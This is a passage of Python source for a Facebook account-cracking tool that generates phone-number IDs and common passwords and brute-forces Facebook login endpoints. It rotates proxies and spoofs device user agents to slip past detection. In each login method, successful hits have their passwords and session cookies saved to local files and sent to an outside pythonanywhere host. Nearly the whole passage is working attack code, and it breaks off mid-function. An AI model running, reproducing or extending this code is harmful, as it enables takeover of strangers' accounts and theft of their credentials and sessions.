        jalan(f'\033[1;31m[\033[1;37m!\033[1;31m]\033[1;37m INVALID METHOD! SETTING TO METHOD 1')
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    
    with tred(max_workers=60) as samira:
        clear()
        tl = str(len(user))
        print(logo)
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m SIM CODE \033[1;37m:\x1b[38;5;46m {code} ')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID \033[1;37m:\x1b[38;5;46m {tl}  \x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mMETHOD \033[1;37m: \x1b[38;5;46mM\x1b[38;5;46m{mthd} ')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈')
        jalan('\033[1;37m═══════════════════════════════════════════════════')
        for psx in user:
            uid = code + psx
            passlist = [psx, uid, uid[3:], uid[4:], uid[5:], uid[:8], uid[:7], uid[:6], '@#@#@#', '@#1234']
            if mthd in ['1', '01']:
                samira.submit(rndm1, uid, passlist)
            elif mthd in ['2', '02']:
                samira.submit(rndm2, uid, passlist)
            elif mthd in ['3', '03']:
                samira.submit(rndm3, uid, passlist)
            elif mthd in ['4', '04']:
                samira.submit(rndm4, uid, passlist)
            elif mthd in ['5', '05']:
                samira.submit(rndm5, uid, passlist)
            else:
                samira.submit(rndm1, uid, passlist)
    jalan('\033[1;37m')
    jalan('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m THE PROCESS HAS COMPLETED')
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m TOTAL OK ID : ' + str(len(oks)))
    jalan(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m TOTAL CP ID : ' + str(len(cps)))
    jalan('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'\x1b[38;5;196m[\x1b[38;5;46m🔖\x1b[38;5;196m]\x1b[38;5;46m PRESS ENTER TO BACK ')
    menu()


#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid, passlist):
    global loop
    global oks
    global cps
    global proxy
    global ugen
    bo = random.choice([m, k, h, b, u, x])
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f'\r\r{R}[{abir}ZERO-M1{R}]{G}-{R}[{bo}%s{R}]{G}-{X}[{R}OK•%s{M1}/{Y}CP•{Y}%s{X}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            smdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
            uaa4 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(smdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())

            datax = {
    'adid': adid,
    'format': 'json',
    'device_id': device_id,
    'email': uid,
    'password': pas,
    'generate_analytics_claims': '1',
    'community_id': '',
    'cpl': 'true',
    'try_num': '1',
    'family_device_id': str(uuid.uuid4()),
    'credentials_type': 'password',
    'source': 'login',
    'error_detail_type': 'button_with_disabled',
    'enroll_misauth': 'false',
    'generate_session_cookies': '1',
    'generate_machine_id': '1',
    'currently_logged_in_userid': '0',
    'locale': 'en_US',
    'client_country_code': 'US',
    'fb_api_req_friendly_name': 'authenticate',
    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
}
            headers = {
    'User-Agent': uaa4,
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'X-FB-Connection-Type': 'WIFI',
    'X-Tigon-Is-Retry': 'False',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
    'x-fb-device-group': '5120',
    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=datax, headers=headers, proxies=max).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                res = requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}').text
                if res == 'live':
                    print(f'\r\x1b[1;92m[ZERO-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}💛{X1} " + coki)
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    with open('/sdcard/ZERO-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'lock':
                    print(f'\r\x1b[1;31;40m|ZERO-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
               # print(f'\r\r{B}[{Y}ZERO-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/ZERO-M1-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid, passlist):
    global loop
    global oks
    global cps
    global proxy
    bo = random.choice([m, k, h, b, u, x])
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f'\r\r{R}[{abir}ZERO-M2{R}]{G}-{R}[{bo}%s{R}]{G}-{X}[{R}OK•%s{M1}/{Y}CP•{Y}%s{X}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            smdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
            ua4 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(smdl))+";FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
            datax = {
'adid':str(uuid.uuid4()),
'format':'json',
'device_id':str(uuid.uuid4()),
'email':uid,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'family_device_id':str(uuid.uuid4()),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'en_US',
'client_country_code':'US',
'fb_api_req_friendly_name':'authenticate',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            headers = {
                'User-Agent': ua4,
                'Accept-Encoding':  'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=datax, headers=headers, proxies=max).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                res = requests.get(f'https://rajx.pythonanywhere.com/live?uid={uid}').text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[ZERO-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}💛{X1} " + coki)
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    with open('/sdcard/ZERO-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;31;40m|ZERO-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                #print(f'\r\r{B}[{Y}ZERO-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/ZERO-M2-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            mdlx = ('SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V')
            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r\r{R}[{abir}ZERO-M3{R}]{G}-{R}[{bo}%s{R}]{G}-{X}[{R}OK•%s{M1}/{Y}CP•{Y}%s{X}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            fb = "touch"
            free_fb = session.get(f'https://{fb}.facebook.com').text
            log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb)).group(1),'api_key': '', 'cancel_url': 'https://account.mconverter.eu/login_facebook.php?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=XkrF9qYSwIboCKBGh6UGeoSeRghSu6kD%3B#_=_', 'display': 'page', 'isprivate': '', 'return_session': '', 'skip_api_login': '1', 'signed_next': '1', 'trynum': '1', 'timezone': '-360', 'lgndim': re.search('name="lgndim" value="(.*?)"',str(free_fb)).group(1),'lgnrnd': re.search('name="lgnrnd" value="(.*?)"',str(free_fb)).group(1), 'lgnjs': re.search('name="lgnjs" value="(.*?)"',str(free_fb)).group(1),'email': uid, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'contact_point', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'false', 'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAB', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            header_freefb = {
                "Host": f'{fb}.facebook.com',
                "method": 'POST',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                "cache-control": 'no-cache, no-store, must-revalidate',
                "referer": f'https://{fb}.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": '?0',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?1',
                "pragma": 'no-cache',
                "priority": 'u=1',
                "cross-origin-resource-policy": 'cross-origin',
                "upgrade-insecure-requests": '1',
                'user-agent': ua3,
            }
            lo = session.post('https://www.facebook.com/login/?_rdc=2&_rdr', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                sort = coki.split("sb=")[1]
                coki1 = coki.split("1000")[1]
                xd = "1000" + coki1[0:11]
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://rajx.pythonanywhere.com/live?uid={uid}'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[ZERO-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}💛{X1} sb={sort} ")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{coki}")
                    with open('/sdcard/ZERO-RNDM-OK.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|ZERO-LOCK| {uid} | {pas}')
                  #  print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[ZERO-2F] {uid} [💙] {pas} ')
                    with open('/sdcard/ZERO-2F💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                   # print(f'\r\033[1;30m[ZERO--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/ZERO-CP💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#______________#

#__________________| RANDOM METHOD M4 |__________________#
def rndm4(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            uat3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r\r{R}[{abir}ZERO-M4{R}]{G}-{R}[{bo}%s{R}]{G}-{X}[{R}OK•%s{M1}/{Y}CP•{Y}%s{X}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            free_fb = session.get('https://touch.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
